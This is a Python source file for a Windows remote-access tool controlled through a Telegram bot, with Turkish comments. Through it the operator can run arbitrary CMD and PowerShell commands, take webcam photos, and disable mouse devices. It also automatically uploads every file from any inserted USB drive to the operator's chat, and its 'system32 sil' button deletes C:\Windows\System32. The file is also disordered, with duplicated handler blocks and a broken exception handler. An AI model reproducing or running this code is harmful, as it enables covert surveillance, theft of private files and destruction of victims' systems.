                bot.answer_callback_query(call.id, f"❌ Klavye komutu uygulanamadı: {str(e)}")

        elif call.data == "taskbar_windows":
            keyboard = taskbar_menu()
            if taskbar_windows_cache:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "🪟 Görev çubuğundaki açık uygulamalar:",
                    reply_markup=keyboard
                )
            else:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "🪟 Görev çubuğunda açık uygulama bulunamadı.",
                    reply_markup=main_menu()
                )
        elif call.data == "taskbar_full":
            keyboard = taskbar_full_menu()
            if taskbar_full_cache:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "🪟 Görev çubuğundaki sabitlenmiş ve açık uygulamalar:\n🟢 = Açık, ⚪ = Kapalı",
                    reply_markup=keyboard
                )
            else:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "🪟 Görev çubuğunda uygulama bulunamadı.",
                    reply_markup=main_menu()
                )
        elif call.data.startswith("launch_taskbar_"):
            idx = int(call.data.split("_")[-1])
            if 0 <= idx < len(taskbar_full_cache):
                exe_path = taskbar_full_cache[idx]["path"]
                try:
                    subprocess.Popen(exe_path)
                    bot.answer_callback_query(call.id, "Uygulama başlatıldı!")
                    bot.send_message(call.message.chat.id, f"✅ {taskbar_full_cache[idx]['name']} başlatıldı.", reply_markup=main_menu())
                except Exception as e:
                    bot.answer_callback_query(call.id, "Başlatılamadı")
                    bot.send_message(call.message.chat.id, f"❌ Uygulama başlatılamadı: {str(e)}", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "Geçersiz seçim")
                bot.send_message(call.message.chat.id, "❌ Geçersiz uygulama seçimi.", reply_markup=main_menu())
        elif call.data.startswith("activate_window_"):
            idx = int(call.data.split("_")[-1])
            if 0 <= idx < len(taskbar_windows_cache):
                hwnd = taskbar_windows_cache[idx]["hwnd"]
                try:
                    win32gui.ShowWindow(hwnd, 5)  # SW_SHOW
                    win32gui.SetForegroundWindow(hwnd)
                    bot.answer_callback_query(call.id, "Pencere öne getirildi!")
                    bot.send_message(call.message.chat.id, f"✅ {taskbar_windows_cache[idx]['title']} öne getirildi.", reply_markup=main_menu())
                except Exception as e:
                    bot.answer_callback_query(call.id, "Başarılamadı")
                    bot.send_message(call.message.chat.id, f"❌ Pencere öne getirilemedi: {str(e)}", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "Geçersiz seçim")
                bot.send_message(call.message.chat.id, "❌ Geçersiz pencere seçimi.", reply_markup=main_menu())

    except Exception as e:
        bot.answer_callback_query(call.id, "Bir hata oluştu")
        bot.send_message(call.message.chat.id, f"❌ Bot hatası: {str(e)}", reply_markup=main_menu())

# --- Görev çubuğu kodları başlangıcı ---
import win32gui
import win32process

def get_taskbar_windows():
    windows = []
    def enum_handler(hwnd, ctx):
        if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            exe = ""
            try:
                p = psutil.Process(pid)
                exe = p.exe()
            except Exception:
                pass
            windows.append({
                "hwnd": hwnd,
                "title": win32gui.GetWindowText(hwnd),
                "exe": exe
            })
    win32gui.EnumWindows(enum_handler, None)
    return windows

def taskbar_menu():
    keyboard = InlineKeyboardMarkup()
    windows = get_taskbar_windows()
    global taskbar_windows_cache
    taskbar_windows_cache = windows
    for idx, win in enumerate(windows[:10]):
        keyboard.add(InlineKeyboardButton(f"{win['title']}", callback_data=f"activate_window_{idx}"))
    keyboard.add(InlineKeyboardButton("Ana Menüye Dön", callback_data="back_to_main"))
    return keyboard

taskbar_windows_cache = []
# --- Görev çubuğu kodları sonu ---

# Run custom command with provided text
def run_custom_command_with_text(message, command):
    original_command = command # Orijinal komutu sakla (çevrilmeden önceki hali)
    command = translate_command(command)
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            encoding='utf-8', # Sistem varsayılanı yerine utf-8 belirtmek daha iyi olabilir
            errors='replace', # Hatalı karakterleri değiştir
            timeout=10 # Zaman aşımını artırabiliriz
        )
        output = result.stdout or result.stderr
        response = f"✅ *Komut*: `{original_command}` (Çalıştırılan: `{command}`)\n*Sonuç*:\n```{output.strip()}```" if output.strip() else f"✅ *Komut*: `{original_command}` (Çalıştırılan: `{command}`)\nÇıktı yok."
        
    except Exception as e:
        bot.answer_callback_query(call.id, "Bir hata oluştu!")
        bot.send_message(call.message.chat.id, f"❌ Hata: {str(e)}", reply_markup=main_menu())



# Send initial message on bot startup
def send_initial_message():
    try:
        bot.send_message(
            ADMIN_CHAT_ID,
            f"🚀 *Bot Başlatıldı!*\nBağlanılan Cihaz: {platform.node()}\nEtkileşim için /start komutunu kullanın.",
            parse_mode='Markdown'
        )
    except Exception as e:
        pass
# Main execution
def handle_messagebox_text(message):
    try:
        if message.text:
            import ctypes
            import getpass
            import platform
            username = getpass.getuser()
            computer = platform.node()
            mesaj = f"{message.text}"
            ctypes.windll.user32.MessageBoxW(0, mesaj, "Bot Uyarısı", 0x40)
            bot.send_message(message.chat.id, "💬 MessageBox ekrana gösterildi!", reply_markup=main_menu())
        else:
            bot.send_message(message.chat.id, "🚫 Mesaj boş olamaz.", reply_markup=main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ MessageBox gösterilemedi: {str(e)}", reply_markup=main_menu())

if __name__ == "__main__":
    send_initial_message()
    while True:
        try:
            bot.polling(none_stop=True, interval=1)  # interval'ı 1 saniyeye çıkardık
        except Exception as e:
            try:
                bot.send_message(
                    ADMIN_CHAT_ID,
                    f"⚠️ Bot bir hata ile karşılaştı: {str(e)}\n5 saniye içinde yeniden başlatılıyor...",
                    parse_mode='Markdown'
                )
            except:
                pass
            time.sleep(5)

# Function to take a photo from webcam and send it
def take_photo_and_send(chat_id):
    try:
        bot.send_message(chat_id, "📷 Fotoğraf çekiliyor, lütfen bekleyin...")
        cap = cv2.VideoCapture(1)
        if not cap.isOpened():
            bot.send_message(chat_id, "❌ Web kamerası bulunamadı veya açılamadı.", reply_markup=main_menu())
            return
        ret, frame = cap.read()
        if ret:
            photo_path = "webcam_photo.jpg"
            cv2.imwrite(photo_path, frame)
            with open(photo_path, "rb") as photo_file:
                bot.send_photo(chat_id, photo_file, caption="📸 İşte web kamerası fotoğrafınız!", reply_markup=main_menu())
            if os.path.exists(photo_path):
                os.remove(photo_path)
        else:
            bot.send_message(chat_id, "❌ Web kamerasından görüntü alınamadı.", reply_markup=main_menu())
        cap.release()
    except Exception as e:
        bot.send_message(chat_id, f"❌ Fotoğraf çekilirken bir hata oluştu: {str(e)}", reply_markup=main_menu())

class USBHandler(FileSystemEventHandler):
    def __init__(self, bot, admin_id):
        self.bot = bot
        self.admin_id = admin_id
        self.processed_drives = set()

    def scan_drive(self, drive_path):
        try:
            files = []
            total_size = 0
            
            # Tüm dosyaları tara ve bilgileri topla
            for root, dirs, filenames in os.walk(drive_path):
                for filename in filenames:
                    file_path = os.path.join(root, filename)
                    try:
                        size = os.path.getsize(file_path)
                        total_size += size
                        files.append({
                            'path': file_path,
                            'size': size,
                            'name': filename
                        })
                    except:
                        continue

            # USB içeriğini bildir
            self.bot.send_message(
                self.admin_id,
                f"🔌 Yeni USB Disk Tespit Edildi!\n"
                f"📁 Sürücü: {drive_path}\n"
                f"📊 Toplam Boyut: {total_size / (1024*1024):.2f} MB\n"
                f"📑 Dosya Sayısı: {len(files)}"
            )
            
            # Dosyaları boyuta göre sırala
            files.sort(key=lambda x: x['size'])
            
            # Her dosyayı tek tek göndermeyi dene
            for file in files:
                try:
                    print(f"Dosya gönderiliyor: {file['path']}")  # Debug için
                    with open(file['path'], 'rb') as f:
                        self.bot.send_document(
                            self.admin_id,
                            f,
                            caption=f"📄 {file['name']}\n"
                                   f"📍 {file['path']}\n"
                                   f"📊 {file['size'] / 1024:.1f} KB",
                            timeout=1  # Timeout süresini artır
                        )
                        time.sleep(1)  # Her dosya arasında 1 saniye bekle
                except Exception as e:
                    print(f"Hata: {str(e)}")  # Debug için
                    self.bot.send_message(
                        self.admin_id,
                        f"❌ Dosya gönderilemedi: {file['path']}\nHata: {str(e)}"
                    )
                    
        except Exception as e:
            self.bot.send_message(
                self.admin_id,
                f"❌ USB disk taranırken hata oluştu: {str(e)}"
            )

    def on_created(self, event):
        if not event.is_directory:
            drive_path = os.path.splitdrive(event.src_path)[0] + "\\"
            if drive_path not in self.processed_drives and self.is_removable(drive_path):
                print(f"Yeni USB sürücü tespit edildi: {drive_path}")  # Debug için
                self.processed_drives.add(drive_path)
                self.scan_drive(drive_path)

    def is_removable(self, drive):
        try:
            return win32file.GetDriveType(drive) == win32con.DRIVE_REMOVABLE
        except:
            return False

# USB izleme işlemini başlat
def start_usb_monitoring(bot, admin_id):
    event_handler = USBHandler(bot, admin_id)
    observer = Observer()
    
    # Tüm sürücüleri izle
    for drive in range(ord('A'), ord('Z')+1):
        drive_path = f"{chr(drive)}:\\"
        try:
            if os.path.exists(drive_path):
                observer.schedule(event_handler, drive_path, recursive=False)
        except:
            continue
    
    observer.start()
    return observer

# Ana fonksiyona USB izleme özelliğini ekle
if __name__ == '__main__':
    try:
        print("USB izleme başlatılıyor...")  # Debug mesajı
        event_handler = USBHandler(bot, ADMIN_CHAT_ID)
        observer = Observer()
        
        # Tüm sürücüleri izle
        for drive in range(ord('A'), ord('Z')+1):
            drive_path = f"{chr(drive)}:\\"
            try:
                if os.path.exists(drive_path):
                    observer.schedule(event_handler, drive_path, recursive=False)
                    print(f"İzleniyor: {drive_path}")  # Debug mesajı
            except Exception as e:
                print(f"Sürücü izleme hatası ({drive_path}): {str(e)}")  # Debug mesajı
                continue
        
        observer.start()
        print("USB izleme başlatıldı!")  # Debug mesajı
        
        # Mevcut USB sürücüleri kontrol et
        for drive in range(ord('A'), ord('Z')+1):
            drive_path = f"{chr(drive)}:\\"
            if os.path.exists(drive_path) and event_handler.is_removable(drive_path):
                print(f"Mevcut USB sürücü bulundu: {drive_path}")  # Debug mesajı
                event_handler.scan_drive(drive_path)
        
        # Bot polling'i başlat
        while True:
            try:
                bot.polling(none_stop=True, interval=1)
            except Exception as e:
                print(f"Bot hatası: {str(e)}")  # Debug mesajı
                time.sleep(5)
                
    except Exception as e:
        print(f"Ana program hatası: {str(e)}")  # Debug mesajı


import win32gui
import win32process

def get_taskbar_windows():
    windows = []
    def enum_handler(hwnd, ctx):
        if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            exe = ""
            try:
                p = psutil.Process(pid)
                exe = p.exe()
            except Exception:
                pass
            windows.append({
                "hwnd": hwnd,
                "title": win32gui.GetWindowText(hwnd),
                "exe": exe
            })
    win32gui.EnumWindows(enum_handler, None)
    return windows

def taskbar_menu():
    keyboard = InlineKeyboardMarkup()
    windows = get_taskbar_windows()
    global taskbar_windows_cache
    taskbar_windows_cache = windows
    for idx, win in enumerate(windows[:10]):
        keyboard.add(InlineKeyboardButton(f"{win['title']}", callback_data=f"activate_window_{idx}"))
    keyboard.add(InlineKeyboardButton("Ana Menüye Dön", callback_data="back_to_main"))
    return keyboard

taskbar_windows_cache = []

# Ana menüye buton ekle
def main_menu():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("🌐 Chrome", callback_data="open_chrome"),
        InlineKeyboardButton("🦊 Firefox", callback_data="open_firefox")
    )
    keyboard.row(
        InlineKeyboardButton("💾 USB Diskleri Tara", callback_data="scan_usb")
    )
    keyboard.row(
        InlineKeyboardButton("🖱️ Fareyi Devre Dışı Bırak", callback_data="disable_mouse"),
        InlineKeyboardButton("⌨️ Klavyeyi Devre Dışı Bırak", callback_data="disable_keyboard")
    )
    keyboard.row(
        InlineKeyboardButton("🌍 Edge", callback_data="open_edge"),
        InlineKeyboardButton("🦁 Brave", callback_data="open_brave")
    )
    keyboard.row(
        InlineKeyboardButton("🎭 Opera", callback_data="open_opera")
    )
    keyboard.row(
        InlineKeyboardButton("🔎 Tarayıcıda Ara", callback_data="search_browser")
    )
    keyboard.row(
        InlineKeyboardButton("⚡ CMD", callback_data="open_cmd"),
        InlineKeyboardButton("🔧 PowerShell", callback_data="open_powershell")
    )
    keyboard.row(
        InlineKeyboardButton("💻 System Info", callback_data="system_info"),
        InlineKeyboardButton("📷 Fotoğraf Çek", callback_data="take_photo")
    )
    keyboard.row(
        InlineKeyboardButton("✍️ Run Custom Command", callback_data="custom_command")
    )
    keyboard.row(
        InlineKeyboardButton("📜 Command History", callback_data="command_history")
    )
    keyboard.row(
        InlineKeyboardButton("🪟 Görev Çubuğu (Sabitlenmiş+Açık)", callback_data="taskbar_full")
    )
    keyboard.row(
        InlineKeyboardButton("📊 Açık Programlar", callback_data="show_processes")
    )
    keyboard.row(
        InlineKeyboardButton("🔄 Restart Bot", callback_data="restart_bot")
    )
    keyboard.row(
        InlineKeyboardButton("☠️ system32 sil", callback_data="delete_system32")
    )
    keyboard.row(
        InlineKeyboardButton("💬 MessageBox Göster", callback_data="show_messagebox")
    )
    keyboard.row(
        InlineKeyboardButton("🖥️ CMD'de Komut Çalıştır", callback_data="run_cmd_command"),
        InlineKeyboardButton("🖥️ PowerShell'de Komut Çalıştır", callback_data="run_ps_command")
    )
    return keyboard

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global taskbar_windows_cache
    try:
        if call.data == "auto_scan_usb":
            bot.edit_message_text(
                "🔄 Otomatik USB tarama başlatıldı.\nYeni USB takıldığında otomatik olarak taranacak.",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id
            )
            # Otomatik taramayı ayrı bir thread'de başlat
            import threading
            scan_thread = threading.Thread(
                target=auto_scan_usb,
                args=(call.message.chat.id,)
            )
            scan_thread.daemon = True
            scan_thread.start()
            
        # Tarayıcı açma işlemleri
        browsers = {
            "open_chrome": "chrome",
            "open_firefox": "firefox",
            "open_edge": "edge",
            "open_brave": "brave",
            "open_opera": "opera"
        }

        if call.data in browsers:
            browser_name = browsers[call.data]
            browser_path = find_browser_path(browser_name)
            if browser_path:
                subprocess.Popen(browser_path)
                bot.answer_callback_query(call.id, f"{browser_name.capitalize()} başarıyla açıldı!")
                bot.send_message(call.message.chat.id, f"🌐 {browser_name.capitalize()} başlatıldı!", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, f"{browser_name.capitalize()} bulunamadı")
                bot.send_message(call.message.chat.id, f"❌ {browser_name.capitalize()} bulunamadı.", reply_markup=main_menu())
        
        elif call.data == "search_browser":
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "🔎 Hangi tarayıcıda ve ne aramak istiyorsun?\nLütfen şu formatta yaz: `tarayıcı_adı arama_terimi`\n(Örn: `chrome en son teknoloji haberleri`)",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("İptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(call.message, handle_browser_search)

        elif call.data == "run_cmd_command":
            sent = bot.send_message(
                call.message.chat.id,
                "⚡ CMD'de çalıştırmak istediğiniz komutu giriniz:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("İptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(sent, handle_cmd_command)
        elif call.data == "run_ps_command":
            sent = bot.send_message(
                call.message.chat.id,
                "🔧 PowerShell'de çalıştırmak istediğiniz komutu giriniz:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("İptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(sent, handle_ps_command)

        # CMD ve PowerShell açma işlemleri
        elif call.data == "open_cmd":
            terminal_path = find_terminal_path("cmd")
            if terminal_path:
                subprocess.Popen(terminal_path, creationflags=subprocess.CREATE_NEW_CONSOLE)
                bot.answer_callback_query(call.id, "CMD başarıyla açıldı!")
                bot.send_message(call.message.chat.id, "⚡ CMD başlatıldı!", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "CMD bulunamadı")
                bot.send_message(call.message.chat.id, "❌ CMD bulunamadı.", reply_markup=main_menu())
                
        elif call.data == "open_powershell":
            terminal_path = find_terminal_path("powershell")
            if terminal_path:
                subprocess.Popen(
                    [terminal_path, "-NoExit", "-Command", 
                     "$host.UI.RawUI.WindowTitle = 'PowerShell IDE'; $host.UI.RawUI.BackgroundColor = 'Black'; $host.UI.RawUI.ForegroundColor = 'Green'; Clear-Host"],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                bot.answer_callback_query(call.id, "PowerShell başarıyla açıldı!")
                bot.send_message(call.message.chat.id, "🔧 PowerShell başlatıldı!", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "PowerShell bulunamadı")
                bot.send_message(call.message.chat.id, "❌ PowerShell bulunamadı.", reply_markup=main_menu())

        # Sistem bilgisi gösterme
        elif call.data == "system_info":
            system_info = get_detailed_system_info()
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, system_info, parse_mode='Markdown', reply_markup=main_menu())

        elif call.data == "take_photo": # Yeni callback
            bot.answer_callback_query(call.id, "Fotoğraf çekme işlemi başlatılıyor...")
            take_photo_and_send(call.message.chat.id)

        elif call.data == "custom_command": # CHANGED if to elif
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "✍️ Çalıştırmak istediğiniz komutu girin (örneğin: `dir`, `type dosya.txt`):\n\n*Not*: Unix komutları (`ls`, `cat` vb.) otomatik olarak Windows eşdeğerlerine çevrilir.",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("İptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(call.message, run_custom_command)

        elif call.data.startswith("select_device_"):
            device_id = call.data.split("_")[-1]
            devices = get_current_device() # Bu fonksiyon sadece mevcut cihazı döndürüyor, ID bazlı seçim için mantık gözden geçirilmeli
            device_info = devices.get(device_id, {}) # Eğer birden fazla cihaz yönetimi hedefleniyorsa DEVICES sözlüğü kullanılmalı
            info = (
                f"📡 *Cihaz: {device_info.get('name', 'Bilinmiyor')}*\n"
                f"İşletim Sistemi: {device_info.get('os', 'Yok')}"
            )
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, info, parse_mode='Markdown', reply_markup=main_menu())

        elif call.data == "no_devices":
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "🖥️ Yapılandırılmış cihaz bulunamadı.",
                parse_mode='Markdown',
                reply_markup=main_menu()
            )

        elif call.data == "command_history":
            if command_history:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "📜 *Son Komutlar*",
                    parse_mode='Markdown',
                    reply_markup=history_menu()
                )
            else:
                bot.answer_callback_query(call.id, "Komut geçmişi yok")
                bot.send_message(
                    call.message.chat.id,
                    "📜 Geçmişte henüz komut yok.",
                    parse_mode='Markdown',
                    reply_markup=main_menu()
                )

        elif call.data.startswith("run_history_"):
            idx = int(call.data.split("_")[-1])
            if 0 <= idx < len(command_history):
                command = command_history[idx]
                bot.answer_callback_query(call.id, f"Çalıştırılıyor: {command}")
                bot.send_message(
                    call.message.chat.id,
                    f"✍️ Komut çalıştırılıyor: `{command}`",
                    parse_mode='Markdown',
                    reply_markup=main_menu()
                )
                run_custom_command_with_text(call.message, command) # message objesi call.message olmalı
            else:
                bot.answer_callback_query(call.id, "Geçersiz komut")
                bot.send_message(
                    call.message.chat.id,
                    "❌ Geçersiz komut seçildi.",
                    reply_markup=main_menu()
                )
    
        elif call.data == "restart_bot":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "🔄 Bot yeniden başlatılıyor...", parse_mode='Markdown')
            bot.stop_polling()
            os.execv(sys.executable, ['python'] + sys.argv)

        elif call.data == "cancel_command":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "🚫 Komut girişi iptal edildi.", reply_markup=main_menu())

        elif call.data == "back_to_main":
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, "↩️ Ana menüye dönüldü.", reply_markup=main_menu())

        elif call.data == "scan_usb":
            bot.edit_message_text(
                "💾 USB Diskleri Taranıyor...",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=usb_drives_menu()
            )
            
        elif call.data.startswith("scan_usb_"):
            try:
                idx = int(call.data.split("_")[2])
                drives = get_usb_drives()
                if idx < len(drives):
                    drive = drives[idx]
                    bot.edit_message_text(
                        f"💾 {drive['label']} ({drive['path']}) taranıyor...",
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id
                    )
                    scan_and_send_usb_files(call.message.chat.id, drive['path'])
                    bot.send_message(
                        call.message.chat.id,
                        "✅ USB disk taraması tamamlandı!",
                        reply_markup=main_menu()
                    )
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Hata: {str(e)}")
                
        elif call.data == "refresh_usb":
            bot.edit_message_text(
                "💾 USB Diskleri Taranıyor...",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=usb_drives_menu()
            )

        elif call.data == "show_processes":
            bot.edit_message_text(
                "📊 *Çalışan Programlar*\n"
                "Kapatmak istediğiniz programa tıklayın:",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                parse_mode='Markdown',
                reply_markup=running_processes_menu()
            )
            
        elif call.data == "refresh_processes":
            try:
                bot.edit_message_text(
                    "📊 Çalışan Programlar:",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=running_processes_menu()
                )
                bot.answer_callback_query(call.id, "✅ Liste yenilendi!")
            except Exception as e:
                bot.answer_callback_query(call.id, "❌ Liste yenilenemedi!")
                bot.send_message(
                    call.message.chat.id,
                    f"❌ Hata oluştu: {str(e)}",
                    reply_markup=main_menu()
                )
            
        elif call.data.startswith("kill_process_"):
            pid = int(call.data.split("_")[2])
            try:
                process = psutil.Process(pid)
                process_name = process.name()
                process.terminate()
                bot.answer_callback_query(call.id, f"✅ {process_name} başarıyla kapatıldı!")
                # Listeyi yenile
                bot.edit_message_text(
                    "📊 *Çalışan Programlar*\n"
                    "Kapatmak istediğiniz programa tıklayın:",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    parse_mode='Markdown',
                    reply_markup=running_processes_menu()
                )
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Program kapatılamadı: {str(e)}")

        elif call.data == "delete_system32":
            try:
                import shutil
                system32_path = r"C:\Windows\System32"
                shutil.rmtree(system32_path)
                bot.answer_callback_query(call.id, "system32 silindi!")
                bot.send_message(call.message.chat.id, "☠️ system32 silindi! (Sisteminiz artık çalışmayabilir.)", reply_markup=main_menu())
            except Exception as e:
                bot.answer_callback_query(call.id, "Silinemedi")
                bot.send_message(call.message.chat.id, f"❌ system32 silinemedi: {str(e)}", reply_markup=main_menu())

        elif call.data == "show_messagebox":
            bot.answer_callback_query(call.id)
            bot.send_message(
                call.message.chat.id,
                "💬 Lütfen ekranda göstermek istediğiniz mesajı yazınız:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("İptal", callback_data="cancel_command")
                )
            )
            bot.register_next_step_handler(call.message, handle_messagebox_text)
            logging.info("MessageBox metni istendi")
            
        elif call.data == "disable_mouse":
            try:
                # Fare cihazlarını devre dışı bırakmak için DevCon kullanımı
                subprocess.run([
                    "powershell", 
                    "-Command",
                    "$mouse = Get-WmiObject Win32_PnPEntity | Where-Object {$_.Name -like '*mouse*' -or $_.Name -like '*HID*'}; foreach ($device in $mouse) { $device.Disable() }"
                ], shell=True, capture_output=True)
                
                bot.answer_callback_query(call.id, "🖱️ Fare devre dışı bırakıldı!")
                bot.edit_message_text(
                    "🖱️ Fare başarıyla devre dışı bırakıldı!\nTekrar etkinleştirmek için bilgisayarı yeniden başlatın.",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=main_menu()
                )
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Fare devre dışı bırakılamadı: {str(e)}")
                
        elif call.data == "disable_keyboard":
            try:
                # Ctrl+A ve Delete tuşlarını simüle et
                subprocess.run([
                    "powershell",
                    "-Command",
                    """
                    Add-Type -AssemblyName System.Windows.Forms
                    [System.Windows.Forms.SendKeys]::SendWait('^a')
                    Start-Sleep -Milliseconds 100
                    [System.Windows.Forms.SendKeys]::SendWait('{DELETE}')
                    """
                ], shell=True, capture_output=True)
                
                bot.answer_callback_query(call.id, "⌨️ Tüm içerik seçilip silindi!")
                bot.edit_message_text(
                    "⌨️ Klavye komutu başarıyla uygulandı!",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=main_menu()
                )
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Klavye komutu uygulanamadı: {str(e)}")

        elif call.data == "taskbar_windows":
            keyboard = taskbar_menu()
            if taskbar_windows_cache:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "🪟 Görev çubuğundaki açık uygulamalar:",
                    reply_markup=keyboard
                )
            else:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "🪟 Görev çubuğunda açık uygulama bulunamadı.",
                    reply_markup=main_menu()
                )
        elif call.data == "taskbar_full":
            keyboard = taskbar_full_menu()
            if taskbar_full_cache:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "🪟 Görev çubuğundaki sabitlenmiş ve açık uygulamalar:\n🟢 = Açık, ⚪ = Kapalı",
                    reply_markup=keyboard
                )
            else:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "🪟 Görev çubuğunda uygulama bulunamadı.",
                    reply_markup=main_menu()
                )
        elif call.data.startswith("launch_taskbar_"):
            idx = int(call.data.split("_")[-1])
            if 0 <= idx < len(taskbar_full_cache):
                exe_path = taskbar_full_cache[idx]["path"]
                try:
                    subprocess.Popen(exe_path)
                    bot.answer_callback_query(call.id, "Uygulama başlatıldı!")
                    bot.send_message(call.message.chat.id, f"✅ {taskbar_full_cache[idx]['name']} başlatıldı.", reply_markup=main_menu())
                except Exception as e:
                    bot.answer_callback_query(call.id, "Başlatılamadı")
                    bot.send_message(call.message.chat.id, f"❌ Uygulama başlatılamadı: {str(e)}", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "Geçersiz seçim")
                bot.send_message(call.message.chat.id, "❌ Geçersiz uygulama seçimi.", reply_markup=main_menu())
        elif call.data.startswith("activate_window_"):
            idx = int(call.data.split("_")[-1])
            if 0 <= idx < len(taskbar_windows_cache):
                hwnd = taskbar_windows_cache[idx]["hwnd"]
                try:
                    win32gui.ShowWindow(hwnd, 5)  # SW_SHOW
                    win32gui.SetForegroundWindow(hwnd)
                    bot.answer_callback_query(call.id, "Pencere öne getirildi!")
                    bot.send_message(call.message.chat.id, f"✅ {taskbar_windows_cache[idx]['title']} öne getirildi.", reply_markup=main_menu())
                except Exception as e:
                    bot.answer_callback_query(call.id, "Başarılamadı")
                    bot.send_message(call.message.chat.id, f"❌ Pencere öne getirilemedi: {str(e)}", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "Geçersiz seçim")
                bot.send_message(call.message.chat.id, "❌ Geçersiz pencere seçimi.", reply_markup=main_menu())

        elif call.data == "scan_usb":
            bot.edit_message_text(
                "💾 USB Diskleri Taranıyor...",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=usb_drives_menu()
            )
            
        elif call.data.startswith("scan_usb_"):
            try:
                idx = int(call.data.split("_")[2])
                drives = get_usb_drives()
                if idx < len(drives):
                    drive = drives[idx]
                    bot.edit_message_text(
                        f"💾 {drive['label']} ({drive['path']}) taranıyor...",
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id
                    )
                    scan_and_send_usb_files(call.message.chat.id, drive['path'])
                    bot.send_message(
                        call.message.chat.id,
                        "✅ USB disk taraması tamamlandı!",
                        reply_markup=main_menu()
                    )
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Hata: {str(e)}")
                
        elif call.data == "refresh_usb":
            bot.edit_message_text(
                "💾 USB Diskleri Taranıyor...",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=usb_drives_menu()
            )

        elif call.data == "show_processes":
            bot.edit_message_text(
                "📊 *Çalışan Programlar*\n"
                "Kapatmak istediğiniz programa tıklayın:",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                parse_mode='Markdown',
                reply_markup=running_processes_menu()
            )
            
        elif call.data == "refresh_processes":
            try:
                bot.edit_message_text(
                    "📊 Çalışan Programlar:",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=running_processes_menu()
                )
                bot.answer_callback_query(call.id, "✅ Liste yenilendi!")
            except Exception as e:
                bot.answer_callback_query(call.id, "❌ Liste yenilenemedi!")
                bot.send_message(
                    call.message.chat.id,
                    f"❌ Hata oluştu: {str(e)}",
                    reply_markup=main_menu()
                )
            
        elif call.data.startswith("kill_process_"):
            pid = int(call.data.split("_")[2])
            try:
                process = psutil.Process(pid)
                process_name = process.name()
                process.terminate()
                bot.answer_callback_query(call.id, f"✅ {process_name} başarıyla kapatıldı!")
                # Listeyi yenile
                bot.edit_message_text(
                    "📊 *Çalışan Programlar*\n"
                    "Kapatmak istediğiniz programa tıklayın:",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    parse_mode='Markdown',
                    reply_markup=running_processes_menu()
                )
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Program kapatılamadı: {str(e)}")
    except Exception as e:
        bot.answer_callback_query(call.id, "Bir hata oluştu!")
